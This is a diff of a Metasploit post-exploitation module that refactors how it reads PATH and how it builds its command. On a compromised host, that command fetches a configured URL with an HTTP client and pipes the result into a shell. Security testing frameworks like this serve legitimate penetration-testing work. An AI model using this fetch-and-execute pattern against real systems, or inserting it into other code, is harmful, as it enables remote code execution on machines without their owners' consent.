@@ -45,7 +45,7 @@ class Metasploit3 < Msf::Post
   end
 
   def exists_exe?(exe)
-    path = expand_path(ENV['PATH'])
+    path = expand_path("$PATH")
     if path.nil? or path.empty?
       return false
     end
@@ -108,10 +108,10 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    if datastore['URL'].match(/https/)
-      cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | `which #{@shell}` ")
+    if datastore['URL'].match(%r{^https://})
+      cmd_exec_vprint("#{@http_client} #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
     else
-      cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{datastore['URL']} 2>/dev/null | `which #{@shell}` ")
+      cmd_exec_vprint("#{@http_client} #{@stdout_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
     end
   end
 
